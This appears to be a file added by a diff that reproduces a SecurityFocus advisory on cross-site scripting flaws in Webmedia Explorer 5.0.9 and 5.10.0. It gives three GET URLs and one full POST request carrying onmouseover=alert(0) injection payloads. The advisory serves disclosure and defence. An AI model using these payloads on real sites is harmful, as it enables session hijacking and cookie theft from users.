@@ -1,0 +1,28 @@
+source: http://www.securityfocus.com/bid/35368/info
+
+Webmedia Explorer is prone to multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied data.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.
+
+Webmedia Explorer 5.0.9 and 5.10.0 are vulnerable; other versions may also be affected. 
+
+http://www.example.com/webmediaexpl/htdocs/index.php?search=" onmouseover=alert(0) ---
+http://www.example.com/webmediaexpl/htdocs/?view=2&thisisnotarealcall=&#039;)" onmouseover=alert(0) > ---
+http://www.example.com/webmediaexpl/htdocs/index.php?dir=&bookmark=" onmouseover=alert(0) > ---&action=edit
+
+POST Method - Cross Site Scripting:
+Host: [HOST]
+User-Agent: FireFox-3-RoXx
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip,deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 300
+Connection: keep-alive
+Referer:
+http://[HOST]/webmediaexpl/htdocs/index.php?action=remember
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 58
+
+Post Content:
+email=%22+onmouseover%3Dalert%280%29+%3E+---&captcha_code=
